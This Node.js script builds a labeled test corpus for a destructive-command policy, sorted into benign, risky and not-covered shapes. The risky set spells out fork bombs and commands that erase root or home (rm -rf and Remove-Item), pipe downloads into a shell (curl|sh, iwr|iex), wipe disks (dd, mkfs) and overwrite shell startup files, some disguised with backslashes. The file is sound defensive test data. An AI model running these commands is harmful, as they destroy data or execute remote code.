#!/usr/bin/env node
'use strict';

// Builds test/fixtures/destructive_commands.json: labeled command strings that test the optional
// destructive-command policy (lib/destructive.js and zn_gate/destructive.py).
//
//   benign   ordinary developer commands: the policy must allow every one (each block is a false positive)
//   risky    the command shapes the policy exists for, with varied arguments (each allow is a miss)
//   not_covered  shapes the policy deliberately does not read; it allows them, and the docs say so
//
// The strings are test data for a classifier: they are never run. Hosts are reserved names
// (example.com, .test, .invalid) and documentation addresses (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24).
// The output is deterministic: run `node test/fixtures/make_destructive_corpus.js` to rewrite it.

const fs = require('fs');
const path = require('path');

// A small fixed-seed generator, so "random" variation is the same on every run.
let seed = 20261019;
function rnd(n) {
  seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0;
  return seed % n;
}
const pick = (a) => a[rnd(a.length)];
function sample(list, n) {
  const a = list.slice();
  for (let i = a.length - 1; i > 0; i--) { const j = rnd(i + 1); [a[i], a[j]] = [a[j], a[i]]; }
  return a.slice(0, Math.min(n, a.length));
}
const product = (...lists) => lists.reduce((acc, l) => acc.flatMap((x) => l.map((y) => x.concat([y]))), [[]]);

const HOSTS = ['get.example.com', 'install.example.test', 'scripts.example.invalid', 'dl.example.com', 'cdn.example.test',
  '192.0.2.10', '198.51.100.7', '203.0.113.5:8080', 'example.com'];
const FILES = ['install.sh', 'setup.sh', 'bootstrap', 'get', 'install', 'run.sh', 'v2/install.sh'];
const url = () => 'https://' + pick(HOSTS) + '/' + pick(FILES);
const PREFIXES = ['', '', '', 'sudo ', 'cd /srv/app && ', 'env CI=1 ', 'time '];

/* ------------------------------ benign ------------------------------ */
const benign = new Set();
const add = (...cmds) => cmds.forEach((c) => benign.add(c));

// Removing build output and caches.
const BUILD_DIRS = ['node_modules', 'dist', 'build', 'target', '.venv', '.next', '.cache', 'coverage', '__pycache__', '.pytest_cache',
  'out', 'tmp', '.gradle', 'vendor', '.turbo', '.parcel-cache', 'bin/Debug', 'obj', 'site-packages', '.tox'];
for (const [flag, a, b] of product(['-rf', '-fr', '-r', '-Rf', '-rv', '--recursive --force'], BUILD_DIRS, BUILD_DIRS).filter(() => rnd(7) === 0)) {
  add(pick(PREFIXES) + 'rm ' + flag + ' ' + a + ' ' + b);
}
add('rm -rf /home/alice/project/../other', 'rm -rf /home/alice/project/./build', 'rm -rf /home/alice/project/sub/../build', 'rm -rf ~/project/../project/build', 'rm -rf $HOME/project/../work/tmp', 'rm -rf /tmp/../tmp/build', 'rm -rf /var/../var/tmp/build',
  'rm -rf ../build', 'rm -rf ../../build', 'rm -rf ./project/../build', 'rm -rf build/..', 'rm -rf C:/Users/alice/project/../other', 'rm -rf C:\\Users\\alice\\project\\.\\build', 'find /home/alice/project/../other -delete');
add('rm -rf node_modules dist build target .venv', 'rm -rf node_modules package-lock.json && npm install', 'rm -rf ./dist ./build',
  'rm -rf dist && npm run build', 'rm -rf .git/hooks/pre-commit.sample', 'rm -f *.log', 'rm -f build.log', 'rm -r old_notes/', 'rm file.txt',
  'rm -i draft.md', 'rmdir empty_dir', 'rm -rf "$BUILD_DIR"', 'rm -rf $WORKDIR/out', 'rm -rf "${TMPDIR:-/tmp}/zn-test"');
const NEAR = ['~/projects/old-app', '~/Downloads/archive', '~/.cache/pip', '~/.npm/_cacache', '$HOME/.cache/yarn', '"$HOME/.local/share/Trash"',
  '${HOME}/tmp/scratch', '~/Library/Caches/com.example.app', '/tmp/build-4821', '/tmp/*', '/var/tmp/zn', '/var/lib/apt/lists/*', '/var/cache/apk/*',
  '/usr/local/lib/node_modules/example-pkg', '/home/runner/work/_temp', '/opt/app/releases/20261001', '/srv/www/old-site', './out', '../tmp',
  '/usr/share/doc/example', '/etc/apt/sources.list.d/example.list', '/home/alice/projects/app/build', '/Users/bob/Library/Developer/Xcode/DerivedData',
  '/mnt/data/cache', '/root/.cache/pip', '~/go/pkg/mod/cache', '~/.gradle/caches', '$HOME/.m2/repository/org/example'];
for (const t of NEAR) for (const flag of sample(['-rf', '-fr', '-r', '--recursive --force'], 2)) add(pick(['', 'sudo ', '']) + 'rm ' + flag + ' ' + t);
add('find . -name "*.pyc" -delete', 'find . -name node_modules -type d -prune -exec rm -rf {} +', 'find ~/projects -name .DS_Store -delete',
  'find /tmp -mtime +7 -delete', 'find / -name "*.orig" -type f 2>/dev/null', 'find ~ -name "*.bak" -mtime +30 -delete', 'find . -type f -empty -delete',
  'find /var/log -name "*.gz" -mtime +14 -delete', 'find . -name "*.tmp" | xargs rm', 'find ~/Downloads -type f -name "*.iso"');

// git.
const BRANCHES = ['main', 'next', 'develop', 'feat/login', 'fix/null-check', 'release/1.4', 'chore/deps'];
for (const b of BRANCHES) add('git checkout ' + b, 'git switch -c ' + b, 'git push origin ' + b, 'git pull --rebase origin ' + b, 'git merge --no-ff ' + b,
  'git branch -d ' + b, 'git log --oneline origin/' + b + '..HEAD', 'git diff ' + b + '...HEAD --stat');
add('git status', 'git add -A && git commit -m "wip"', 'git commit -m "docs: warn that curl | sh installs are unsafe"',
  'git commit -m "remove rm -rf ~ from the cleanup script"', 'git stash push -m "before rebase"', 'git clean -fdx -n', 'git clean -fd', 'git reset --hard HEAD~1',
  'git restore --staged .', 'git tag -a v1.2.3 -m "release"', 'git remote -v', 'git fetch --all --prune', 'git rebase -i HEAD~3'.replace('-i ', ''),
  'git log -p -- README.md', 'git blame src/index.js', 'git bisect start', 'git submodule update --init --recursive', 'git worktree add ../wt-fix fix/x');

// Package managers and build tools.
for (const pkg of ['express', 'react', 'left-pad', 'typescript', '@types/node', 'zod']) add('npm install ' + pkg, 'npm install --save-dev ' + pkg, 'npm uninstall ' + pkg, 'pnpm add ' + pkg, 'yarn add ' + pkg);
for (const pkg of ['requests', 'numpy', 'pytest', 'black', 'fastapi']) add('pip install ' + pkg, 'pip install -U ' + pkg, 'python -m pip install ' + pkg + ' --user', 'pip uninstall -y ' + pkg, 'uv pip install ' + pkg);
add('npm ci', 'npm test', 'npm run build', 'npm run lint -- --fix', 'npx tsc --noEmit', 'npm publish --dry-run', 'npm audit', 'npm run dev', 'node --test', 'node index.js',
  'yarn install --frozen-lockfile', 'pnpm -r build', 'pip install -r requirements.txt', 'python -m venv .venv', 'source .venv/bin/activate', 'pytest -q tests/', 'python -m pytest -x',
  'ruff check .', 'mypy src', 'poetry install', 'cargo build --release', 'cargo test', 'cargo clippy -- -D warnings', 'cargo fmt --check', 'go build ./...', 'go test ./... -race',
  'go mod tidy', 'mvn -q clean package', 'gradle build -x test', './gradlew assemble', 'dotnet build -c Release', 'dotnet test', 'make', 'make clean', 'make -j4 all', 'cmake -B build -S .',
  'cmake --build build', 'bundle install', 'rake test', 'composer install', 'swift build', 'flutter pub get', 'tsc -p tsconfig.json', 'eslint src --ext .ts', 'prettier --check .');

// Containers, cloud, infrastructure.
for (const img of ['node:20', 'python:3.12-slim', 'postgres:16', 'redis:7', 'nginx:alpine']) add('docker pull ' + img, 'docker run --rm -it ' + img + ' sh', 'docker run -d -p 8080:80 ' + img, 'docker rmi ' + img);
add('docker build -t app:dev .', 'docker compose up -d', 'docker compose down -v', 'docker ps -a', 'docker logs -f web', 'docker exec -it web sh -c "rm -rf /app/cache"',
  'docker exec db psql -U postgres -c "select 1"', 'docker system prune -f', 'docker run --rm -v "$PWD":/work alpine rm -rf /work/tmp', 'kubectl get pods -n staging', 'kubectl apply -f deploy.yaml',
  'kubectl delete pod web-1 -n staging', 'kubectl logs deploy/api --tail=100', 'terraform plan', 'terraform apply -auto-approve', 'aws s3 ls s3://example-bucket/', 'aws s3 cp build/ s3://example-bucket/ --recursive',
  'aws sts get-caller-identity', 'gcloud compute instances list', 'az group list', 'helm upgrade --install app ./chart', 'ssh deploy@203.0.113.5 "systemctl restart app"', 'scp dist.tar.gz deploy@198.51.100.7:/srv/app/');

// Downloads that are fine.
for (let i = 0; i < 30; i++) {
  const u = url();
  const f = pick(['archive.tar.gz', 'tool.zip', 'data.json', 'install.sh', 'release.tgz']);
  add(pick(['curl -fsSL ', 'curl -sSL ', 'curl -L ', 'curl -s ']) + u + ' -o ' + f);
  add(pick(['wget -q ', 'wget ', 'wget -nv ']) + u + ' -O ' + f);
}
for (const h of HOSTS) {
  const u = 'https://' + h + '/api/status';
  add('curl -s ' + u + ' | jq .', 'curl -s ' + u + ' | jq -r .version', 'curl ' + u + ' | python3 -m json.tool', 'curl -s ' + u + ' | grep ok', 'curl -sI ' + u + ' | head -1',
    'curl -fsSL https://' + h + '/pkg.tar.gz | tar xz -C /tmp/pkg', 'wget -qO- https://' + h + '/pkg.tar.gz | tar -xz', 'curl -fsSL https://' + h + '/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg',
    'curl -fsSL https://' + h + '/repo.list | sudo tee /etc/apt/sources.list.d/example.list', 'curl -X POST -H "Content-Type: application/json" -d \'{"a":1}\' ' + u, 'curl -fsSL https://' + h + '/install.sh | sh -n',
    'curl -fsSL https://' + h + '/install.sh | shellcheck -', 'curl -fsSL https://' + h + '/install.sh | less', 'curl -fsSL https://' + h + '/install.sh | sha256sum', 'curl -s ' + u + ' > status.json',
    'curl --fail ' + u + ' 2>&1 | tee check.log', 'wget --spider ' + u);
}
add('curl -fsSL https://get.example.com/install.sh -o install.sh && less install.sh', 'curl -o ./config.json https://example.com/config.json', 'curl -fsSL https://example.com/a -o ~/.config/app/config.toml',
  'curl https://example.com/ | wc -c', 'wget https://example.com/file.zip && unzip file.zip', 'curl -fsSL https://example.com/x.sh > x.sh && shellcheck x.sh', 'curl ifconfig.me');

// Shell startup files, edited the usual ways.
add('echo \'export PATH="$HOME/bin:$PATH"\' >> ~/.bashrc', 'echo "alias ll=\'ls -la\'" >> ~/.zshrc', 'cat ~/.bashrc', 'source ~/.zshrc', '. ~/.bashrc', 'cp ~/.bashrc ~/.bashrc.bak',
  'grep -n alias ~/.bashrc', 'sed -i \'s/old/new/\' ~/.zshrc', 'code ~/.zshrc', 'vim ~/.bash_profile', 'diff ~/.bashrc ~/dotfiles/bashrc', 'ln -sf ~/dotfiles/zshrc ~/.zshrc', 'cp dotfiles/.zshrc ~/.zshrc',
  'tail -5 ~/.profile', 'echo "set -o vi" | tee -a ~/.bashrc', 'printf "export EDITOR=vim\\n" >> $HOME/.profile', 'exec zsh -l', 'source ~/.config/fish/config.fish');

// Permissions and ownership, the normal cases.
add('chmod +x script.sh', 'chmod 755 bin/run', 'chmod 644 README.md', 'chmod 600 ~/.ssh/id_example', 'chmod -R 755 ./dist', 'chmod -R u+rwX ~/projects/app', 'chmod -R go-w ~/.ssh', 'chmod 777 /tmp/shared.sock',
  'chmod -R 777 ./tmp-uploads', 'chown -R $USER:$USER ./data', 'chown -R www-data:www-data /var/www/html/app', 'sudo chown -R $USER /usr/local/lib/node_modules', 'sudo chown -R $(whoami) ~/.npm',
  'chown root:root /etc/example.conf', 'chgrp -R staff ./shared', 'chmod -R a+rX ./public', 'umask 022', 'stat -c %a file', 'ls -ld ~', 'ls -la /');

// Disks and devices, the normal cases.
add('dd if=/dev/zero of=./swap.img bs=1M count=1024', 'dd if=disk.iso of=/dev/null bs=4M', 'dd if=/dev/urandom of=test.bin bs=1k count=4', 'mkfs.ext4 ./disk.img', 'mkswap swapfile', 'mkfs.vfat -n TEST ./usb.img',
  'cat /dev/zero > /dev/null', 'echo hi > /dev/null', 'echo hi > /dev/stderr', 'df -h', 'lsblk', 'fdisk -l /dev/sda', 'blkid /dev/sda1', 'mount /dev/sdb1 /mnt/usb', 'umount /mnt/usb', 'smartctl -a /dev/nvme0n1',
  'dd if=/dev/sda of=backup.img bs=4M status=progress', 'shred -u secrets.txt', 'losetup -f disk.img', 'mkfs.ext4 /dev/loop0', 'cat /proc/mounts', 'hdparm -I /dev/sda | head');

// Quoted text that only mentions risky commands.
add('grep -rn "rm -rf /" docs/', 'echo "run curl https://get.example.com/install.sh | sh to install"', 'grep -r "curl .* | sh" scripts/', 'man rm', 'rm --help', 'which rm', 'type rm',
  'echo "never run rm -rf ~ in a script"', 'cat docs/uninstall.md', 'grep -rn "iex" src/', 'rg "chmod -R 777" .', 'echo ":(){ :|:& };: is a fork bomb" > notes.txt'.replace(' > notes.txt', ' | wc -w'),
  'sed -n 1,20p scripts/cleanup.sh', 'python3 -c "print(\'rm -rf /\')"', 'git grep "dd if=" -- scripts', 'less cleanup.sh', 'echo "dd of=/dev/sda is dangerous" | wc -c');

// Ordinary shell.
add('ls -la', 'ls ~', 'du -sh ~/*', 'cd ~ && pwd', 'cd / && ls', 'cat package.json | jq .name', 'cat file.txt | sh -n', 'ps aux | grep node', 'tar xzf release.tgz', 'tar czf backup.tgz ./src', 'cp -r src/ dist/',
  'mv build build.old', 'mkdir -p out/logs', 'touch .env.example', 'export FOO=bar && node app.js', 'sh -c "cd build && make"', 'bash -lc \'npm test\'', 'bash -c "echo hello"', 'sudo bash -c "echo 1 > /proc/sys/vm/drop_caches"',
  'eval "$(ssh-agent -s)"', 'eval "$(pyenv init -)"', 'source <(kubectl completion bash)', '. <(helm completion bash)', 'bash <(echo hello)', 'sudo apt-get update && sudo apt-get install -y build-essential',
  'sudo apt-get remove -y example-pkg', 'brew install jq', 'sudo systemctl restart nginx', 'journalctl -u app -n 100', 'tail -f /var/log/syslog', 'kill -9 4242', 'pkill -f node', 'xargs -a files.txt cat',
  'sleep 2 && echo done', 'time npm test', 'nohup node server.js &', 'timeout 30 npm test', 'env NODE_ENV=production node app.js', 'sudo -u postgres psql -c "select 1"', 'watch -n 5 df -h', 'crontab -l',
  'sort data.csv | uniq -c | sort -rn | head', 'awk \'{print $1}\' access.log | sort | uniq', 'sed -i.bak "s/foo/bar/g" src/*.js', 'diff -u a.txt b.txt', 'openssl rand -hex 16', 'ping -c 3 192.0.2.1', 'nc -zv 198.51.100.7 22',
  'nslookup example.com', 'curl -I https://example.com', 'whoami', 'uname -a', 'echo $HOME', 'echo ~', 'ls ~/.ssh', 'cd "$HOME/projects" && ls', 'true || rm -rf node_modules', 'test -d ~/projects || mkdir ~/projects');

// More commands that sit close to the risky shapes.
add('curl -fsSL https://get.example.com/install.sh | bash -n', 'sudo rm -rf /var/lib/docker/overlay2/abc123', 'rm -rf /home/runner/work/_temp/*', 'rm -rf /tmp', 'rm -rf /usr/local/go && tar -C /usr/local -xzf go1.23.linux-amd64.tar.gz',
  'rm -rf /Library/Developer/CommandLineTools', 'rm -rf /home/$USER/.cache/pip', 'chmod -R 755 /var/www/html', 'chown -R www-data /var/www', 'cat install.sh | sh', 'cat local-script.sh | bash -s -- --dry-run',
  'dd if=/dev/zero of=/dev/null bs=1M count=10', 'dd if=/dev/zero of=/dev/stdout bs=1 count=1', 'echo test > /dev/tty', 'mkfs.ext4 -F ./test-disk.img', 'wget -qO- https://example.com/data.json | jq .items',
  'docker run --rm alpine sh -c "rm -rf /tmp/*"', 'sudo rm -rf /opt/example-app/old', 'sudo rm -rf /usr/lib/example', 'rm -rf $HOME/.config/example-app', 'rm -rf "$HOME/Library/Application Support/Example"',
  'chmod -R 777 build/tmp', 'ls /home', 'ls /Users', 'cd /home/alice && ls', 'cat /etc/hosts', 'cp /etc/hosts ~/hosts.bak', 'tar czf ~/backup.tgz ~/projects');

// Backslashes in words (bash drops them), Windows paths that keep them.
add('echo cu\\rl', 'echo s\\h', 'curl https://example.com/i.sh | s\\h -n', 'curl -o C:\\Users\\example\\tool.exe https://example.com/tool.exe', 'C:\\Users\\example\\tool.exe --version',
  'C:\\Users\\example\\tool.exe https://example.com/x | C:\\Windows\\System32\\findstr.exe x', 'type C:\\Users\\example\\src\\run.sh');

// PowerShell and cmd.
add('Remove-Item -Recurse -Force .\\node_modules', 'Remove-Item -Recurse -Force .\\dist, .\\build', 'Remove-Item -Recurse -Force $env:TEMP\\build-4821', 'Remove-Item -Force old.log', 'Remove-Item C:\\Users\\alice\\AppData\\Local\\Temp\\zn -Recurse',
  'rm -r -fo node_modules', 'ri .\\out -Recurse -Force', 'rd /s /q build', 'rd /s /q node_modules', 'del /q *.tmp', 'del /s /q .\\dist\\*.map', 'rmdir /s /q C:\\work\\app\\build',
  'Invoke-WebRequest https://example.com/a.zip -OutFile a.zip', 'iwr https://example.com/a.zip -OutFile $env:TEMP\\a.zip', 'irm https://example.com/api/status | ConvertFrom-Json', 'Invoke-RestMethod https://example.com/api | Select-Object -First 1',
  'Invoke-WebRequest https://example.com | Select-Object -ExpandProperty StatusCode', 'Get-Content $PROFILE', 'Add-Content $PROFILE \'Set-Alias ll Get-ChildItem\'', 'notepad $PROFILE', 'Get-ChildItem -Recurse -Filter *.log',
  'Get-Process node | Stop-Process', 'Set-Location $HOME', 'Copy-Item .\\a.txt $HOME\\Documents\\', 'iex "dotnet build"', 'Invoke-Expression $command', 'powershell -Command "Get-Date"', 'pwsh -c "dotnet test"',
  'cmd /c dir', 'cmd /c "rd /s /q build"', 'dir C:\\', 'icacls C:\\work\\app /grant Users:F /T', 'Get-Disk', 'Get-Volume', 'Format-Table -AutoSize', 'Expand-Archive a.zip -DestinationPath out', 'npm.cmd install');

/* ------------------------------ risky ------------------------------ */
const risky = [];
const seen = new Set();
const addRisk = (rule, cmd) => { if (!seen.has(cmd)) { seen.add(cmd); risky.push({ cmd, rule }); } };

// rm_root_home
const RM_FLAGS = ['-rf', '-fr', '-Rf', '-r -f', '-rfv', '-rf --no-preserve-root', '--recursive --force', '-r', '-Rv', '-rf --'];
const RM_TARGETS = ['~', '~/', '~/*', '$HOME', '"$HOME"', '${HOME}', '$HOME/', '$HOME/*', '/', '/*', '/usr', '/etc', '/var/*', '/home', '/home/alice', '/Users/bob', '/root', '/bin', '/boot', '/System', '/Library', '/opt'];
for (const [fl, t, p] of sample(product(RM_FLAGS, RM_TARGETS, PREFIXES), 70)) addRisk('rm_root_home', p + 'rm ' + fl + ' ' + t);
for (const t of ['~', '/', '$HOME', '/etc', '~/*', '/home/alice']) {
  addRisk('rm_root_home', 'sh -c "rm -rf ' + t + '"');
  addRisk('rm_root_home', "bash -lc 'rm -rf " + t + "'");
  addRisk('rm_root_home', 'cd /tmp && rm -rf ' + t);
  addRisk('rm_root_home', 'true && sudo rm -rf ' + t + ' ; echo done');
  addRisk('rm_root_home', 'rm -rf ' + t + ' 2>/dev/null');
  addRisk('rm_root_home', 'find ' + t + ' -delete');
  addRisk('rm_root_home', 'find ' + t + ' -exec rm -rf {} +');
}
addRisk('rm_root_home', 'rm -rf node_modules ~');
// "." and ".." segments that resolve to the home folder or the root (lexically; example paths only).
for (const t of ['/home/alice/..', '/home/alice/../..', '/home/alice/project/../..', '/home/alice/./project/../', '/Users/bob/project/..', '/usr/..', '/usr/../*', '/etc/../etc/..', '/..', '/../..', '/home/../', '/tmp/../',
  '~/project/..', '~/./', '~/..', '$HOME/project/..', '"$HOME/project/.."', '${HOME}/a/b/../..', '$HOME/../alice', '//home//alice//project//..', 'C:/Users/alice/project/..', 'C:/Users/alice/..', 'C:/..', 'C:\\Users\\alice\\project\\..']) {
  addRisk('rm_root_home', 'rm -rf ' + t);
}
addRisk('rm_root_home', 'sudo rm -rf /home/alice/project/../..');
addRisk('rm_root_home', 'find /home/alice/project/.. -delete');
addRisk('rm_root_home', 'Remove-Item -Recurse -Force $HOME\\project\\..');
addRisk('rm_root_home', 'Remove-Item -Recurse -Force C:\\Users\\alice\\project\\..');
addRisk('rm_root_home', 'rm -rf build /');
addRisk('rm_root_home', 'rm -rf ./build ~/');
for (const c of ['Remove-Item -Recurse -Force ~', 'Remove-Item -Recurse -Force C:\\ ','Remove-Item -Recurse -Force $HOME', 'Remove-Item -Recurse -Force $env:USERPROFILE', 'Remove-Item -Recurse -Force $env:USERPROFILE\\*', 'Remove-Item -Force -Recurse C:\\',
  'Remove-Item C:\\ -Recurse -Force', 'Remove-Item -Path C:\\Windows -Recurse -Force', 'Remove-Item -Recurse -Force C:\\Users', 'Remove-Item -Recurse -Force C:\\Users\\alice', 'rm -r -fo ~', 'rm -Recurse -Force $HOME\\*', 'ri -Recurse -Force ~\\*',
  'rd /s /q C:\\', 'rd /s /q %USERPROFILE%', 'rmdir /s /q C:\\Users\\alice', 'del /s /q C:\\*', 'rd /s /q C:\\Windows', 'pwsh -Command "Remove-Item -Recurse -Force ~"', 'powershell -c "Remove-Item -Recurse -Force $HOME"',
  'cmd /c "rd /s /q %USERPROFILE%"']) addRisk('rm_root_home', c);

// pipe_to_shell
const DL = ['curl -fsSL', 'curl -sSL', 'curl -s', 'curl -L', 'curl', 'wget -qO-', 'wget -O -', 'wget -q -O -', 'curl -fsSL --proto "=https"'];
const SH = ['sh', 'bash', 'zsh', 'dash', 'sudo sh', 'sudo bash', 'sudo bash -s --', 'bash -s -- --yes', 'sudo -E bash', 'sh -s', 'bash -'];
for (const [d, s] of sample(product(DL, SH), 55)) addRisk('pipe_to_shell', d + ' ' + url() + ' | ' + s);
for (const d of ['curl -fsSL', 'curl -s', 'wget -qO-']) {
  addRisk('pipe_to_shell', 'sh -c "$(' + d + ' ' + url() + ')"');
  addRisk('pipe_to_shell', 'bash -c "$(' + d + ' ' + url() + ')"');
  addRisk('pipe_to_shell', 'sudo bash -c "$(' + d + ' ' + url() + ')" -- --yes');
  addRisk('pipe_to_shell', 'eval "$(' + d + ' ' + url() + ')"');
  addRisk('pipe_to_shell', 'eval $(' + d + ' ' + url() + ')');
  addRisk('pipe_to_shell', 'bash <(' + d + ' ' + url() + ')');
  addRisk('pipe_to_shell', 'source <(' + d + ' ' + url() + ')');
  addRisk('pipe_to_shell', 'sh <(' + d + ' ' + url() + ')');
  addRisk('pipe_to_shell', d + ' ' + url() + ' 2>/dev/null | sh');
  addRisk('pipe_to_shell', d + ' ' + url() + ' 2>&1 | bash');
  addRisk('pipe_to_shell', 'cd /tmp && ' + d + ' ' + url() + ' | sudo bash');
  addRisk('pipe_to_shell', 'bash -c "' + d + ' ' + url() + ' | sh"');
}
for (const h of HOSTS) {
  const u = 'https://' + h + '/' + pick(FILES);
  addRisk('pipe_to_shell', 'iwr ' + u + ' | iex');
  addRisk('pipe_to_shell', 'irm ' + u + ' | iex');
  addRisk('pipe_to_shell', 'Invoke-WebRequest -UseBasicParsing ' + u + ' | Invoke-Expression');
  addRisk('pipe_to_shell', 'iex (iwr ' + u + ')');
  addRisk('pipe_to_shell', 'iex ((New-Object Net.WebClient).DownloadString(\'' + u + '\'))');
  addRisk('pipe_to_shell', '(New-Object System.Net.WebClient).DownloadString(\'' + u + '\') | iex');
  addRisk('pipe_to_shell', 'powershell -c "irm ' + u + ' | iex"');
}

// disk_overwrite
const DEVS = ['/dev/sda', '/dev/sdb1', '/dev/nvme0n1', '/dev/nvme1n1p2', '/dev/disk2', '/dev/mmcblk0', '/dev/vda', '/dev/xvda', '/dev/hda', '/dev/mapper/vg0-root', '/dev/md0'];
for (const dev of DEVS) {
  addRisk('disk_overwrite', pick(['', 'sudo ']) + 'dd if=/dev/zero of=' + dev + ' bs=1M');
  addRisk('disk_overwrite', 'dd if=/dev/urandom of=' + dev + ' bs=4M status=progress');
  addRisk('disk_overwrite', 'sudo dd if=image.iso of=' + dev + ' bs=4M conv=fsync');
  addRisk('disk_overwrite', pick(['', 'sudo ']) + pick(['mkfs.ext4', 'mkfs.xfs', 'mkfs.vfat', 'mkfs -t ext4', 'mke2fs', 'mkswap']) + ' ' + dev);
  addRisk('disk_overwrite', 'cat /dev/zero > ' + dev);
  addRisk('disk_overwrite', 'echo x > ' + dev);
}
for (const c of ['wipefs -a /dev/sdc', 'sudo wipefs --all /dev/nvme0n1', 'shred -n1 -z /dev/sda', 'blkdiscard /dev/nvme0n1', 'sudo shred -v /dev/sdb', 'Format-Volume -DriveLetter D -Force', 'Clear-Disk -Number 1 -RemoveData -Confirm:$false',
  'Format-Volume -DriveLetter E -FileSystem NTFS']) addRisk('disk_overwrite', c);

// perm_root
for (const [c, t] of product(['chmod -R 777', 'chmod -R 0777', 'chmod -R a+rwx', 'chmod -Rf 777', 'chmod --recursive 777', 'chown -R nobody', 'chown -R root:root', 'chown -R $USER:$USER', 'chgrp -R users', 'chown -R 1000:1000'],
  ['/', '/etc', '/usr', '/var', '/bin', '/home'])) addRisk('perm_root', pick(['', 'sudo ']) + c + ' ' + t);
for (const t of ['~', '$HOME', '~/*', '/home/alice']) {
  addRisk('perm_root', 'chmod -R 777 ' + t);
  addRisk('perm_root', 'sudo chmod -R 777 ' + t);
  addRisk('perm_root', 'chmod -R a+rwx ' + t);
}

// fork_bomb
for (const c of [':(){ :|:& };:', ':(){ :|: & };:', ': () { : | : & } ; :', ':(){:|:&};:', 'bomb(){ bomb|bomb& };bomb', 'f(){ f|f& };f', 'forkbomb() { forkbomb | forkbomb & }; forkbomb', ':(){ :|:& }; :', 'sh -c ":(){ :|:& };:"', 'bash -c \'bomb(){ bomb|bomb&};bomb\'']) addRisk('fork_bomb', c);

// rc_download
const RCS = ['~/.bashrc', '~/.zshrc', '~/.bash_profile', '~/.profile', '$HOME/.bashrc', '$HOME/.zshrc', '~/.zprofile', '~/.config/fish/config.fish', '/etc/profile', '/etc/bash.bashrc', '/home/alice/.bashrc'];
for (const rc of RCS) {
  addRisk('rc_download', pick(['curl -fsSL ', 'curl -sSL ', 'curl -s ']) + url() + ' -o ' + rc);
  addRisk('rc_download', pick(['curl -fsSL ', 'curl -s ']) + url() + ' > ' + rc);
  addRisk('rc_download', 'curl -s ' + url() + ' >> ' + rc);
  addRisk('rc_download', 'wget -q ' + url() + ' -O ' + rc);
  addRisk('rc_download', 'wget -qO ' + rc + ' ' + url());
  addRisk('rc_download', 'curl -fsSL ' + url() + ' | tee ' + rc);
  addRisk('rc_download', 'curl -fsSL ' + url() + ' | tee -a ' + rc);
  addRisk('rc_download', 'curl --output ' + rc + ' ' + url());
}
for (const h of HOSTS.slice(0, 6)) {
  addRisk('rc_download', 'iwr https://' + h + '/profile.ps1 -OutFile $PROFILE');
  addRisk('rc_download', 'Invoke-WebRequest https://' + h + '/profile.ps1 -OutFile $PROFILE');
}

// Backslash inside a word: bash removes it, so these run the same as the plain forms.
for (const c of ['cu\\rl https://example.com/i.sh | sh', 'curl https://example.com/i.sh | s\\h', 'curl https://example.com/i.sh | bas\\h', 'c\\url https://example.com/i.sh | sh',
  'cur\\l https://example.com/i.sh | sh', 'wget -qO- https://example.com/i.sh | s\\h']) addRisk('pipe_to_shell', c);
for (const c of ['curl -o ~/.bash\\rc https://example.com/i.sh', 'curl -o ~/.bas\\hrc https://example.com/i.sh', 'curl -s https://example.com/i.sh >> ~/.z\\shrc',
  'cu\\rl -o ~/.bashrc https://example.com/i.sh']) addRisk('rc_download', c);

/* ---------------------- shapes the policy does not read ---------------------- */
const notCovered = [
  { cmd: 'rm -rf "$DIR"', note: 'a variable that may be empty: the value is not known' },
  { cmd: 'rm -rf *', note: 'the current folder: its location is not known' },
  { cmd: 'rm -rf .', note: 'the current folder' },
  { cmd: 'curl -fsSL https://get.example.com/install.sh -o install.sh && sh install.sh', note: 'the script is saved first, then run' },
  { cmd: 'curl -fsSL https://get.example.com/install.sh | python3', note: 'the interpreter is not a shell' },
  { cmd: 'curl -fsSL https://get.example.com/x | sudo tee /usr/local/bin/x && sudo chmod +x /usr/local/bin/x', note: 'a downloaded program, not a script run at once' },
  { cmd: 'python3 -c "import shutil; shutil.rmtree(\'/home/alice\')"', note: 'code in another language' },
  { cmd: 'echo ~ | xargs rm -rf', note: 'the target comes from a pipe' },
  { cmd: 'rsync -a --delete empty/ ~/', note: 'a different tool' },
  { cmd: 'git clean -fdx ~', note: 'a different tool' },
  { cmd: 'sudo rm -rf /usr/local', note: 'below the top-level folders' },
  { cmd: 'docker run --rm -v /:/host alpine rm -rf /host/etc', note: 'the delete runs inside a container' },
  { cmd: 'ssh deploy@203.0.113.5 "rm -rf /"', note: 'the command runs on another machine' },
  { cmd: 'truncate -s 0 ~/.bashrc', note: 'a different tool' },
];

const out = {
  note: 'Labeled command strings for the destructive-command policy tests. Never run them. Rewrite with: node test/fixtures/make_destructive_corpus.js',
  benign: Array.from(benign).sort(),
  risky: risky.sort((a, b) => (a.rule + a.cmd < b.rule + b.cmd ? -1 : 1)),
  not_covered: notCovered,
};
fs.writeFileSync(path.join(__dirname, 'destructive_commands.json'), JSON.stringify(out, null, 1) + '\n');
const byRule = {};
for (const r of out.risky) byRule[r.rule] = (byRule[r.rule] || 0) + 1;
console.log('benign', out.benign.length, 'risky', out.risky.length, JSON.stringify(byRule), 'not_covered', out.not_covered.length);
